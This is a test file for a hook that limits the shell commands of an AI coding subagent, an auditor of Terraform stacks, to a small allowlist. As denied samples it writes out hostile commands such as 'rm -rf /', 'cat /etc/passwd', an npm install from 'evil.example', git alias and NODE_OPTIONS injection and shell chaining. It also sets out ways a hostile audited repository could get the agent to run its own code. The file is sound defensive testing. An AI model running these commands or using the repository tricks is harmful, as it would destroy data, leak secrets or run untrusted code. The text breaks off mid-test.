// The command guard of the stacks-auditor subagent (hooks/stacks-auditor-guard.mjs). The guard is one layer,
// not a guarantee (it fails open when Node cannot start it), so these tests pin what it does when it runs:
// the hook is fed hook-input JSON on stdin and the exit code is asserted, as Claude Code would see it.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, readFileSync, realpathSync, rmSync, rmdirSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join as pjoin, resolve } from "node:path";
import { pathToFileURL } from "node:url";
import { HERE } from "./helpers.mjs";

// The commands go to a POSIX-shell guard (a backslash is an escape, so it is denied): every path that is pasted into a command is written with
// forward slashes, which Windows accepts everywhere. `join` here returns that form, and the temporary folders are the long form of the path
// (a Windows runner's temp folder is `C:\Users\RUNNER~1\...`, and a tilde in the middle of a word is denied by the guard).
const sh = (p) => p.replaceAll("\\", "/");
const join = (...parts) => sh(pjoin(...parts));
const SKILL_DIR = join(HERE, "..");
const PLUGIN = join(SKILL_DIR, "..", "..");
const GUARD = join(PLUGIN, "hooks", "stacks-auditor-guard.mjs");
const { SHAPES, USER_SKILL_FOLDERS, decide, pathsOf, guard, PLUGIN: GUARD_PLUGIN, AGENT: GUARD_AGENT, AGENTS } = await import(pathToFileURL(GUARD).href);

// The plugin's own engine: trusted. A fake home with one user-installed engine (.gemini) and stubs for the other cases.
const ENGINE = join(SKILL_DIR, "scripts", "stacks.mjs");
const tmp = (p) => sh(realpathSync.native(mkdtempSync(pjoin(tmpdir(), p))));
const stubSkill = (dir, name = "azure-terraform-stacks-engine") => {
  mkdirSync(join(dir, "scripts"), { recursive: true });
  writeFileSync(join(dir, "scripts", "stacks.mjs"), "// stub engine for the guard tests\n");
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name }));
  return dir;
};
const HOME = tmp("ats-guard-home-");
const USER_SKILL = stubSkill(join(HOME, ".gemini", "skills", "azure-terraform-stacks"));
const USER_ENGINE = join(USER_SKILL, "scripts", "stacks.mjs");
const AUDITED = tmp("ats-guard-repo-"); // an audited repository with nothing in it

// Runs the script as the hook does: JSON on stdin, exit code and stderr out. HOME is the fake home.
const hook = (command, { agent_type = "stacks-auditor", cwd = AUDITED, tool_name = "Bash", home = HOME } = {}) => {
  const input = { hook_event_name: "PreToolUse", tool_name, tool_input: { command }, ...(cwd === null ? {} : { cwd }), ...(agent_type === null ? {} : { agent_type }) };
  const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify(input), encoding: "utf8", env: { ...process.env, HOME: home, USERPROFILE: home } });
  return { code: r.status, stdout: r.stdout, stderr: r.stderr };
};
const allowed = (cmd, opts) => { const r = hook(cmd, opts); assert.equal(r.code, 0, `${cmd}: ${r.stderr}`); assert.equal(r.stderr, ""); };
const denied = (cmd, opts, reason) => {
  const r = hook(cmd, opts);
  assert.equal(r.code, 2, `${cmd} should be denied`);
  assert.match(r.stderr, /stacks-auditor guard: /);
  if (reason) assert.match(r.stderr, reason, cmd);
};

test("hooks.json registers one PreToolUse hook for Bash that runs the guard through the plugin variable", () => {
  const cfg = JSON.parse(readFileSync(join(PLUGIN, "hooks", "hooks.json"), "utf8"));
  const entries = cfg.hooks.PreToolUse;
  assert.equal(entries.length, 1);
  assert.equal(entries[0].matcher, "Bash");
  assert.deepEqual(entries[0].hooks.map((h) => h.type), ["command"]);
  assert.equal(entries[0].hooks[0].command, 'node "${CLAUDE_PLUGIN_ROOT}/hooks/stacks-auditor-guard.mjs"');
  assert.deepEqual(Object.keys(cfg.hooks), ["PreToolUse"]);
});

test("other agents are untouched: no agent_type, another agent, or another tool exit 0 and print nothing", () => {
  for (const cmd of ["terraform apply", "rm -rf /", "a; b"]) {
    for (const agent_type of [null, "general-purpose", "Stacks-Auditor", "stacks-auditor-2", ""]) {
      const r = hook(cmd, { agent_type });
      assert.equal(r.code, 0, `${cmd} for ${String(agent_type)}`);
      assert.equal(r.stdout + r.stderr, "");
    }
  }
  const other = hook("terraform apply", { tool_name: "Read" });
  assert.equal(other.code, 0);
  for (const bad of ["", "not json", "null", "[]"]) {
    const r = spawnSync(process.execPath, [GUARD], { input: bad, encoding: "utf8" });
    assert.equal(r.status, 0, `unparseable input "${bad}" cannot be scoped, so it is not touched`);
  }
});

test("allowed: the engine lookup, the checks and the audit with the plugin's engine or one installed in the user's folders", () => {
  allowed(`ls -d ${ENGINE} /repo/.claude/skills/azure-terraform-stacks/scripts/stacks.mjs ~/.copilot/skills/azure-terraform-stacks/scripts/stacks.mjs`);
  allowed("test -f /x/azure-terraform-stacks/scripts/stacks.mjs");
  allowed("test -d /x/azure-terraform-stacks/node_modules");
  allowed("node --version");
  allowed(`node ${ENGINE} audit`);
  allowed(`node ${ENGINE} audit --root ${AUDITED} --json`);
  allowed(`node ${ENGINE} audit --json --root ${AUDITED}`);
  allowed(`node ${USER_ENGINE} audit --json`);
  allowed("node ~/.gemini/skills/azure-terraform-stacks/scripts/stacks.mjs audit --root " + AUDITED);
});

// ---- Decision of the maintainer (2026-11-24): the engine runs only from the plugin or from the user's skills folders ----
test("the audited repository's own engine is never run: absolute, relative, ./, elsewhere, and under ~", () => {
  const repo = tmp("ats-guard-hostile-");
  const evil = tmp("ats-guard-evil-");
  const inRepo = stubSkill(join(repo, ".claude", "skills", "azure-terraform-stacks"));
  stubSkill(join(repo, "azure-terraform-stacks"));
  stubSkill(join(evil, "azure-terraform-stacks"));
  stubSkill(join(HOME, "x", "azure-terraform-stacks"));
  const cwd = { cwd: repo };
  const why = /inside the audited --root|inside the working directory|is not the engine of this plugin/;
  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit`, cwd, /inside the working directory/);
  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit --root ${repo} --json`, cwd, /inside the working directory/);
  denied("node .claude/skills/azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /inside the working directory/);
  denied("node ./.claude/skills/azure-terraform-stacks/scripts/stacks.mjs audit --json", cwd, /inside the working directory/);
  denied("node ./azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /inside the working directory/);
  denied("node azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /inside the working directory/);
  denied(`node ${join(evil, "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, cwd, /is not the engine of this plugin/);
  denied("node ~/x/azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /is not the engine of this plugin/);
  // the same, from a working directory elsewhere: the project-scope folder is not an origin, and it is not trusted by being named like one
  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit --root ${repo}`, { cwd: AUDITED }, why);
  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit`, { cwd: AUDITED }, /is not the engine of this plugin/);
});

test("engine path rules: a missing path, '..', an unknown working directory and a --root or cwd that contains the engine are denied", () => {
  denied("node ~/.copilot/skills/azure-terraform-stacks/scripts/stacks.mjs audit", {}, /does not exist or does not resolve/);
  denied(`node ${sh(USER_SKILL)}/../azure-terraform-stacks/scripts/stacks.mjs audit`, {}, /\.\./);
  denied(`node ${ENGINE} audit`, { cwd: null }, /working directory is unknown/);
  denied(`node ${ENGINE} audit`, { cwd: SKILL_DIR }, /inside the working directory/);
  denied(`node ${ENGINE} audit`, { cwd: PLUGIN }, /inside the working directory/);
  denied(`node ${ENGINE} audit --root ${PLUGIN}`, {}, /inside the audited --root/);
  denied(`node ${USER_ENGINE} audit --root ${HOME}`, {}, /inside the audited --root/);
  denied(`node ${USER_ENGINE} audit --root ${join(HOME, ".gemini")}`, {}, /inside the audited --root/);
  denied(`node ${USER_ENGINE} audit --root .gemini`, { cwd: HOME }, /inside/);
});

test("symbolic links are resolved: a link in the repository to a trusted engine is denied (as written, inside the repository), and a user folder that links into the audited repository is denied", (t) => {
  const repo = tmp("ats-guard-link-");
  const hostile = stubSkill(join(repo, "azure-terraform-stacks"));
  try {
    mkdirSync(join(repo, "bin"));
    symlinkSync(ENGINE, join(repo, "bin", "stacks.mjs"));
    mkdirSync(join(repo, "azure-terraform-stacks", "scripts"), { recursive: true });
    const trapHome = tmp("ats-guard-traphome-");
    mkdirSync(join(trapHome, ".cursor", "skills"), { recursive: true });
    symlinkSync(hostile, join(trapHome, ".cursor", "skills", "azure-terraform-stacks"), "dir");
    // a link inside the repository named like the engine, pointing at the plugin's engine
    mkdirSync(join(repo, "linked", "azure-terraform-stacks", "scripts"), { recursive: true });
    symlinkSync(ENGINE, join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs"));
    denied(`node ${join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, { cwd: repo }, /inside the working directory/);
    // the same link from another working directory: it resolves to the trusted engine, so it is allowed only when the path as written is outside the audited root
    allowed(`node ${join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, { cwd: AUDITED });
    denied(`node ${join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit --root ${repo}`, { cwd: AUDITED }, /inside the audited --root/);
    // The user's own link ~/.cursor/skills/azure-terraform-stacks -> a copy elsewhere is the user's choice and is trusted by its resolved path,
    // but not when that resolved path is inside the repository being audited (cwd or --root).
    const hostilePath = join(trapHome, ".cursor", "skills", "azure-terraform-stacks", "scripts", "stacks.mjs");
    allowed(`node ${hostilePath} audit`, { cwd: AUDITED, home: trapHome });
    denied(`node ${hostilePath} audit`, { cwd: repo, home: trapHome }, /inside the working directory/);
    denied(`node ${hostilePath} audit --root ${repo}`, { cwd: AUDITED, home: trapHome }, /inside the audited --root/);
    // a link whose target is not an engine folder of the list is not trusted
    const strayHome = tmp("ats-guard-strayhome-");
    mkdirSync(join(strayHome, ".agents", "skills"), { recursive: true });
    symlinkSync(AUDITED, join(strayHome, ".agents", "skills", "azure-terraform-stacks"), "dir");
    denied(`node ${join(strayHome, ".agents", "skills", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, { cwd: AUDITED, home: strayHome }, /does not exist or does not resolve/);
  } catch (e) {
    if (e.code === "EPERM") return t.skip("cannot create a symbolic link here (EPERM, Windows)");
    throw e;
  }
});

test("chaining, pipes, redirects, substitution and newlines are denied before matching", () => {
  const e = `node ${ENGINE} audit`;
  for (const cmd of [
    `${e} && rm -rf x`, `${e} || rm -rf x`, `${e}; rm -rf x`, `${e} & rm -rf x`, `${e} | tee b`, "ls -d a | tee b",
    "echo hi > f", "echo hi >> f", "cat < /etc/passwd", `${e} > out.json`, `${e} 2>&1`,
    "ls -d $(whoami)", "ls -d `whoami`", "ls -d ${HOME}", "ls -d $HOME", "ls -d (a)", "ls -d {a,b}",
    `${e}\nrm -rf x`, `${e}\r\nrm -rf x`, `${e}\trm`.replace("\t", "\u000b"), "ls -d a\u0000b",
    "ls -d a\\ b", "ls -d *", "ls -d ?", "ls -d [a]", "ls -d a #b", "ls -d !x",
    "ls -d \"a;b\"", "ls -d 'a|b'", "ls -d \"$(id)\"", "ls -d '`id`'", "test -f \"a&b\"", `node "${ENGINE}" audit --root "a>b"`,
  ]) denied(cmd);
});

test("node: only the engine's audit; no inline code, no other subcommand, no other script, no extra options", () => {
  for (const cmd of [
    'node -e "1"', "node -e 1", "node -p 1", "node --eval 1", "node --input-type=module", "node -", "node",
    "node --version --help", "node --inspect", "node /tmp/x.mjs", "node ./stacks.mjs audit", "node stacks.mjs audit",
    `node ${ENGINE}`, `node ${ENGINE} scaffold`, `node ${ENGINE} add-stack`, `node ${ENGINE} bridge`, `node ${ENGINE} diagram`,
    `node ${ENGINE} check`, `node ${ENGINE} plan`, `node ${ENGINE} audit --force`, `node ${ENGINE} audit --root`, `node ${ENGINE} audit --root --json`,
    `node ${ENGINE} audit --json --json`, `node ${ENGINE} audit --root a --root b`, `node ${ENGINE} audit extra`, `node ${ENGINE} audit --root=/r`,
    `node /x/../azure-terraform-stacks/scripts/stacks.mjs audit`, `node /x/azure-terraform-stacks/scripts/stacks.mjs.evil audit`,
    `node --require /x/e.js ${ENGINE} audit`, `NODE_OPTIONS=--require=x node ${ENGINE} audit`, `/usr/bin/node ${ENGINE} audit`, `env node ${ENGINE} audit`,
  ]) denied(cmd);
});

test("ls and test: only -d and -f/-d with plain paths", () => {
  for (const cmd of ["ls", "ls -la", "ls -d", "ls -d -a x", "ls -l -d x", "ls /x", "test -e x", "test -f", "test -f a b", "test ! -f a", "test -f -x", "[ -f a ]", "cat /etc/passwd", "find . -delete", "echo hi"])
    denied(cmd);
});

test("npm and npx are not on the allowlist: the engine needs no install, so nothing installs anything", () => {
  const prefix = (p) => `npm ci --prefix ${p} --omit=dev --ignore-scripts`;
  // the shape that used to be allowed, for every folder it used to accept, is now denied by the default rule
  for (const cmd of [prefix(SKILL_DIR), prefix(USER_SKILL), prefix("~/.gemini/skills/azure-terraform-stacks")]) denied(cmd, {}, /`npm` is not on the allowlist/);
  for (const q of ['"', "'"]) denied(prefix(`${q}${SKILL_DIR}${q}`), {}, /metacharacters/);
  const repo = tmp("ats-guard-npm-repo-");
  for (const cwd of [AUDITED, SKILL_DIR, repo, undefined]) {
    for (const cmd of ["npm ci", "npm ci --omit=dev --ignore-scripts", "npm install", "npm i", "npm run test", "npm exec yaml", "npm", "npx yaml", "npx", "pnpm install", "yarn install"]) denied(cmd, { cwd }, /not on the allowlist/);
  }
  for (const bad of [
    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts=false`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --foreground-scripts`,
    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --userconfig ${HOME}/x`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --registry http://evil.example`,
    `npm ci --prefix=${SKILL_DIR} --omit=dev --ignore-scripts`, `npm install --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`, `npm run test --prefix ${SKILL_DIR}`,
  ]) denied(bad, {}, /not on the allowlist/);
  denied(`${prefix(SKILL_DIR)} && ls`, {}, /metacharacters/);
});

// Task 2.4: with a clean filter configured in the audited repository, `git -c core.fsmonitor=false status --porcelain`
// still ran the filter's program (fsmonitor off was not enough), so no git command is allowed at all.
test("git: nothing, because git runs programs named in the audited repository's own configuration", () => {
  for (const cmd of ["git status", "git status --porcelain", "git -c core.fsmonitor=false status --porcelain", "git -c core.fsmonitor=false status --porcelain --ignored",
    "git log", "git diff", "git push", "git commit -m x", "git -c alias.x=!rm status", "git --no-pager status --porcelain", "git -C /r status --porcelain"])
    denied(cmd);
});

test("commands the spec names are denied: terraform, kubectl, az, gh, git push", () => {
  for (const cmd of ["terraform plan", "terraform --version", "kubectl get pods", "az login", "gh pr create", "git push", "rm -rf x", "mv a b", "cp a b", "tee f", "sed -i s/a/b/ f", "python3 -c 1", "bash -c ls", "sh script.sh", "curl http://x", "xargs rm", "sudo ls"])
    denied(cmd);
});

test("an empty or non-string command is denied for the auditor, and a guard error blocks", () => {
  denied("");
  denied("   ");
  for (const c of [undefined, null, 5, {}, []]) assert.equal(decide(c).allow, false);
  const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify({ agent_type: "stacks-auditor", tool_name: "Bash", tool_input: {} }), encoding: "utf8" });
  assert.equal(r.status, 2);
});

test("the deny message tells the agent to stop and not to look for another way", () => {
  assert.match(hook("terraform plan").stderr, /report it to the user and stop|Report it to the user and stop/);
});

// ---- the shapes the agent is told about are the shapes the guard allows ----
const AGENT = readFileSync(join(PLUGIN, "agents", "stacks-auditor.md"), "utf8").replace(/^\uFEFF/, "").replace(/\r\n?/g, "\n"); // CRLF checkouts on Windows

test("the allowed shapes listed in the agent's instructions equal the guard's SHAPES", () => {
  const section = /## Commands you may run[\s\S]*?```text\n([\s\S]*?)```/.exec(AGENT);
  assert.ok(section, "the agent has a 'Commands you may run' block");
  assert.deepEqual(section[1].trim().split("\n").map((l) => l.trim()), SHAPES);
});

test("every shape in SHAPES has a concrete command that the guard allows (so the list cannot drift from the code)", () => {
  const samples = {
    "ls -d <path>...": "ls -d /a /b",
    "test -f <path>": "test -f /a",
    "test -d <path>": "test -d /a",
    "node --version": "node --version",
    "node <engine> audit [--root <path>] [--json]": `node ${ENGINE} audit --root ${AUDITED} --json`,
  };
  assert.equal(SHAPES.length, 5);
  assert.ok(!SHAPES.some((x) => /npm/.test(x)));
  assert.deepEqual(Object.keys(samples), SHAPES);
  for (const s of SHAPES) assert.equal(decide(samples[s], { cwd: AUDITED, home: HOME }).allow, true, s);
});

test("the agent's ls -d line lists the plugin path then the user folders of the guard, which equal the user folders of src/lib/tools.mjs", async () => {
  const line = AGENT.split("\n").map((l) => l.trim()).find((l) => l.startsWith("ls -d ${CLAUDE_PLUGIN_ROOT}"));
  const paths = line.slice("ls -d ".length).split(/\s+/);
  const tail = "azure-terraform-stacks/scripts/stacks.mjs";
  assert.deepEqual(paths.slice(1), USER_SKILL_FOLDERS.map((f) => `~/${f}/${tail}`));
  const { TOOLS } = await import(pathToFileURL(join(PLUGIN, "..", "..", "src", "lib", "tools.mjs")).href);
  assert.deepEqual(USER_SKILL_FOLDERS, [...new Set(Object.values(TOOLS).map((t) => t.user))]);
  assert.ok(!line.includes("<repo>"), "no project-scope folder in the agent's lookup line");
});

test("the guard's own file is not a way around: it is read-only code with no dependency", () => {
  const src = readFileSync(GUARD, "utf8");
  assert.ok(!/from "(?!node:)/.test(src), "imports only node: modules");
  assert.ok(existsSync(join(PLUGIN, "hooks", "hooks.json")));
});

test("--ignore-scripts costs nothing: no package in the engine's lockfile has an install script", () => {
  const lock = JSON.parse(readFileSync(join(SKILL_DIR, "package-lock.json"), "utf8"));
  const withScripts = Object.entries(lock.packages).filter(([, p]) => p.hasInstallScript).map(([n]) => n);
  assert.deepEqual(withScripts, []);
});

// ---- Review cycle 2 (B1): the guard must be sure what the shell hands to the program ----
const hostileTilde = () => {
  const repo = tmp("ats-guard-tilde-");
  stubSkill(join(repo, "~", ".claude", "skills", "azure-terraform-stacks"));
  stubSkill(join(repo, "~", "skill"));
  return repo;
};

test("B1: a tilde inside quotes is a literal path for the shell; the repository's directory named `~` must not pass for the home folder", () => {
  const repo = hostileTilde();
  const evil = "~/.claude/skills/azure-terraform-stacks/scripts/stacks.mjs";
  for (const q of ['"', "'"]) {
    denied(`node ${q}${evil}${q} audit`, { cwd: repo }, /metacharacters/);
    denied(`node ${q}${evil}${q} audit --root ${repo} --json`, { cwd: repo }, /metacharacters/);
    denied(`node ${ENGINE} audit --root ${q}~/x${q}`, { cwd: repo }, /metacharacters/);
    denied(`npm ci --prefix ${q}~/skill${q} --omit=dev --ignore-scripts`, { cwd: repo }, /metacharacters/);
    denied(`ls -d ${q}~/.claude${q}`, { cwd: repo }, /metacharacters/);
    denied(`test -f ${q}~/x${q}`, { cwd: repo }, /metacharacters/);
  }
  // unquoted, the shell expands it to the home folder, and the guard judges that path (not the repository's `~` directory)
  denied(`node ~/.claude/skills/azure-terraform-stacks/scripts/stacks.mjs audit`, { cwd: repo }, /does not exist or does not resolve/);
  allowed(`node ~/.gemini/skills/azure-terraform-stacks/scripts/stacks.mjs audit --root ${repo}`, { cwd: AUDITED });
});

test("every quote and every backslash denies the whole command, in every position of every shape", () => {
  for (const q of ['"', "'", "\\"]) {
    for (const cmd of [
      `ls -d ${q}/a${q}`, `ls -d /a${q}`, `ls -d a${q}b`, `test -f ${q}/a${q}`, `test -d /a${q}`, `node ${q}--version${q}`, `node --version${q}`,
      `node ${q}${ENGINE}${q} audit`, `node ${ENGINE} ${q}audit${q}`, `node ${ENGINE} audit ${q}--json${q}`, `node ${ENGINE} audit --root ${q}${AUDITED}${q}`, `node ${ENGINE} audit --root ${AUDITED}${q}`,
      `npm ${q}ci${q} --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`, `npm ci --prefix ${q}${SKILL_DIR}${q} --omit=dev --ignore-scripts`, `npm ci --prefix ${SKILL_DIR} ${q}--omit=dev${q} --ignore-scripts`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts${q}`,
      `${q}ls${q} -d /a`, `ls -d ${q}${q}`, `node ${ENGINE.slice(0, 5)}${q}${ENGINE.slice(5)} audit`,
    ]) denied(cmd, {}, /metacharacters/);
  }
});

test("a tilde is allowed only as the first character of an unquoted word followed by a slash", () => {
  allowed("ls -d ~/.claude/skills/x ~/.gemini/y");
  allowed("test -d ~/x");
  for (const bad of ["ls -d ~", "ls -d ~+", "ls -d ~-", "ls -d ~user/x", "ls -d ~root", "ls -d a~b", "ls -d /a/~/b", "ls -d a:~/b", "ls -d ~/a~b",
    `node ${ENGINE} audit --root=~/x`, `node ${ENGINE} audit --root ~+/x`, `node ${ENGINE} audit --root ~-/x`, `node ${ENGINE} audit --root a:~/b`, "test -f ~", "test -f ~x/y", `npm ci --prefix ~ --omit=dev --ignore-scripts`])
    denied(bad, {}, /tilde|only|not on|unexpected/);
  for (const bad of ["ls -d $HOME/x", "ls -d ${HOME}/x", "ls -d /a/*", "ls -d /a/{b,c}", "ls -d /a/?", "ls -d /a/[b]", "ls -d /a\\ b"]) denied(bad, {}, /metacharacters/);
});

test("the working directory must be an absolute path of an existing folder", () => {
  const rel = `node ${ENGINE} audit`;
  denied(rel, { cwd: "relative/dir" }, /not an absolute path of an existing folder/);
  denied(rel, { cwd: "." }, /not an absolute path of an existing folder/);
  denied(rel, { cwd: join(tmpdir(), "ats-guard-no-such-cwd") }, /not an absolute path of an existing folder/);
});

test("--root with a .. segment is denied, like the engine", () => {
  denied(`node ${ENGINE} audit --root ${sh(AUDITED)}/../x`, {}, /"\.\." segment/);
  denied(`node ${ENGINE} audit --root ../x`, {}, /"\.\." segment/);
  allowed(`node ${ENGINE} audit --root ${AUDITED}`);
});

test("only the engine itself is trusted, not any file under a trusted folder: a nested copy of the engine or of the folder is denied", () => {
  const nestedEngine = stubSkill(join(USER_SKILL, "copy", "azure-terraform-stacks"));
  denied(`node ${join(nestedEngine, "scripts", "stacks.mjs")} audit`, {}, /is not the engine of this plugin/);
  const nestedPlugin = stubSkill(join(SKILL_DIR, "node_modules", ".ats-test-nested", "azure-terraform-stacks"));
  try {
    denied(`node ${join(nestedPlugin, "scripts", "stacks.mjs")} audit`, {}, /is not the engine of this plugin/);
  } finally {
    rmSync(join(SKILL_DIR, "node_modules", ".ats-test-nested"), { recursive: true, force: true });
    try { rmdirSync(join(SKILL_DIR, "node_modules")); } catch { /* not empty: an installed oracle, leave it */ }
  }
  allowed(`node ${USER_ENGINE} audit`);
});

// ---- Differential test against the REAL shell (skipped on Windows) ----
// For each candidate command the guard approves, the paths it resolved must be the paths the shell really hands to the program.
// Any difference between the guard's model of the shell and the shell fails the test.
const realArgv = (rest, cwd, home) => {
  const r = spawnSync("bash", ["-c", `printf '%s\\0' ${rest}`], { cwd, env: { PATH: process.env.PATH, HOME: home }, encoding: "utf8" });
  return r.status === 0 ? r.stdout.split("\0").slice(0, -1) : null;
};
const shellPaths = (argv) => {
  const [exe, ...a] = argv;
  if (exe === "ls") return a.slice(1);
  if (exe === "test") return [a[1]];
  if (exe === "node") return [a[0], ...(a.includes("--root") ? [a[a.indexOf("--root") + 1]] : [])];
  return [];
};

test("differential: for every command the guard approves, its resolved paths equal the argv the real bash delivers", (t) => {
  if (process.platform === "win32") return t.skip("needs bash");
  const repo = hostileTilde();
  writeFileSync(join(repo, "a b"), "");
  mkdirSync(join(repo, "rel"));
  const q = (x) => x; // placeholders keep the corpus readable
  const E = ENGINE, U = "~/.gemini/skills/azure-terraform-stacks/scripts/stacks.mjs";
  const corpus = [
    `ls -d ${E} ~/.gemini/skills ${USER_ENGINE}`, `ls -d ~/.claude ~/.gemini/skills/azure-terraform-stacks/scripts/stacks.mjs`, "ls -d rel ./rel rel/", "ls -d ~/x/y",
    "test -f ~/.gemini/skills/azure-terraform-stacks/scripts/stacks.mjs", "test -d rel", "test -d ~/",
    `node ${E} audit`, `node ${E} audit --root ${repo} --json`, `node ${U} audit --root ~/x`, `node ${U} audit --json --root rel`, `node ${USER_ENGINE} audit --root ${AUDITED}`,
    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`, "npm ci --prefix ~/.gemini/skills/azure-terraform-stacks --omit=dev --ignore-scripts",
    // hostile and divergent forms: the guard must deny them, and if it ever approves one, the shell must agree
    `node "~/.claude/skills/azure-terraform-stacks/scripts/stacks.mjs" audit`, `node '~/.claude/skills/azure-terraform-stacks/scripts/stacks.mjs' audit`,
    `node ~/.claude/skills/azure-terraform-stacks/scripts/stacks.mjs audit`, `node ${E} audit --root "~/x"`, `node ${E} audit --root='~/x'`, `node ${E} audit --root=~/x`,
    `node ${E} audit --root ~+/x`, `node ${E} audit --root ~-/x`, `node ${E} audit --root ~root/x`, `node ${E} audit --root a:~/b`, "ls -d ~", "ls -d ~+", "ls -d ~-", "ls -d ~/~",
    "ls -d $HOME/x", "ls -d ${HOME}/x", "ls -d /a/*", "ls -d /a/{b,c}", "ls -d rel/?", "ls -d re[l]", "ls -d a\\ b", 'ls -d "a b"', "ls -d 'a b'", "ls -d a\\\\b", `ls -d ""`, "ls -d ''", 'ls -d a"b"', "ls -d ^a", "ls -d =a", "ls -d a=b", "ls -d %a", "ls -d @a", "ls -d a,b", "ls -d a:b",
    `npm ci --prefix "~/skill" --omit=dev --ignore-scripts`, `npm ci --prefix '~/skill' --omit=dev --ignore-scripts`, "npm ci --prefix ~/skill --omit=dev --ignore-scripts",
  ];
  let approved = 0;
  for (const cmd of corpus) {
    const ctx = { cwd: repo, home: HOME };
    const d = decide(cmd, ctx);
    if (!d.allow) continue;
    approved++;
    const argv = realArgv(cmd, repo, HOME);
    assert.ok(argv, `bash could not run: ${cmd}`);
    const real = shellPaths(argv).map((x) => resolve(repo, x));
    const mine = pathsOf(cmd, ctx);
    assert.deepEqual(mine, real, `guard and shell disagree on: ${cmd}`);
    assert.deepEqual(mine.map((x) => (existsSync(x) ? realpathSync(x) : x)), real.map((x) => (existsSync(x) ? realpathSync(x) : x)));
  }
  assert.ok(approved >= 8, `the corpus must exercise approved commands (${approved})`);
});

test("differential: commands denied for quotes, backslashes or tildes are exactly the ones whose argv the guard could not model", (t) => {
  if (process.platform === "win32") return t.skip("needs bash");
  // for these the real shell hands over something different from the raw text, and the guard denies every one of them
  const repo = hostileTilde();
  for (const cmd of [`ls -d "~/x"`, `ls -d '~/x'`, "ls -d ~+", "ls -d ~-", "ls -d a\\ b", `ls -d a"b"c`, "ls -d /a/{b,c}", "ls -d /a/*", "ls -d $HOME"]) {
    assert.equal(decide(cmd, { cwd: repo, home: HOME }).allow, false, cmd);
  }
  const argv = realArgv(`ls -d "~/x" ~/x`, repo, HOME);
  assert.deepEqual(argv, ["ls", "-d", "~/x", join(HOME, "x")], "bash leaves a quoted tilde literal and expands an unquoted one");
});

// ---- fix-stacks-auditor-guard-agent-type: which calls the guard applies to ----
// Claude Code sends `agent_type` "azure-terraform-stacks:stacks-auditor" for the plugin's subagent (captured live on 2026-11-24;
// see openspec/changes/fix-stacks-auditor-guard-agent-type/evidence/live-2026-11-24.md). The fixture has the shape of that input.
const REAL_AGENT_TYPE = "azure-terraform-stacks:stacks-auditor";
const FIXTURE = JSON.parse(readFileSync(join(HERE, "fixtures", "hook-input-plugin-agent.json"), "utf8"));
// Spawns the hook with a raw input object (or string). `env` overrides entries of the environment; an undefined value removes one.
const run = (input, env = {}) => {
  const e = { ...process.env, HOME, USERPROFILE: HOME, ...env };
  for (const k of Object.keys(e)) if (e[k] === undefined) delete e[k];
  const r = spawnSync(process.execPath, [GUARD], { input: typeof input === "string" ? input : JSON.stringify(input), encoding: "utf8", env: e });
  return { code: r.status, stdout: r.stdout, stderr: r.stderr };
};
const fromFixture = (command, { cwd = AUDITED, env, ...rest } = {}) => run({ ...FIXTURE, ...rest, tool_input: { command }, cwd }, env);

test("the fixture is the shape of a real hook input for the plugin's subagent, with no machine-specific data", () => {
  assert.equal(FIXTURE.agent_type, REAL_AGENT_TYPE);
  assert.equal(FIXTURE.tool_name, "Bash");
  assert.equal(FIXTURE.hook_event_name, "PreToolUse");
  assert.equal(FIXTURE.cwd, "__CWD__", "the cwd is a placeholder replaced at run time");
  assert.deepEqual(Object.keys(FIXTURE).sort(), ["agent_type", "cwd", "hook_event_name", "tool_input", "tool_name"], "no session id, transcript path or user name");
});

test("regression (real value): the plugin's subagent is restricted, not ignored", () => {
  for (const cmd of ["terraform --version", "rm -rf x", "a; b", "git status", "node -e 1"]) {
    const r = fromFixture(cmd);
    assert.equal(r.code, 2, `${cmd} must be denied for ${REAL_AGENT_TYPE}: ${r.stderr}`);
    assert.match(r.stderr, /stacks-auditor guard: /);
  }
  // an engine inside the audited repository is never run, with the real value too
  const repo = tmp("ats-guard-real-");
  const inRepo = stubSkill(join(repo, ".claude", "skills", "azure-terraform-stacks"));
  const r = fromFixture(`node ${join(inRepo, "scripts", "stacks.mjs")} audit --root ${repo}`, { cwd: repo });
  assert.equal(r.code, 2);
  assert.match(r.stderr, /inside the working directory/);
});

test("regression (real value): the audit and the other allowed shapes still run", () => {
  for (const cmd of [`node ${ENGINE} audit --root ${AUDITED} --json`, `node ${ENGINE} audit`, "node --version", `ls -d ${ENGINE}`, `test -f ${ENGINE}`]) {
    const r = fromFixture(cmd);
    assert.equal(r.code, 0, `${cmd}: ${r.stderr}`);
    assert.equal(r.stdout + r.stderr, "");
  }
});

test("the short value (agent installed without the plugin) is restricted as before", () => {
  assert.equal(fromFixture("terraform --version", { agent_type: "stacks-auditor" }).code, 2);
  assert.equal(fromFixture(`node ${ENGINE} audit`, { agent_type: "stacks-auditor" }).code, 0);
});

test("agent_type is matched by exact equality with two literals; every other value exits 0 and prints nothing", () => {
  const cases = [
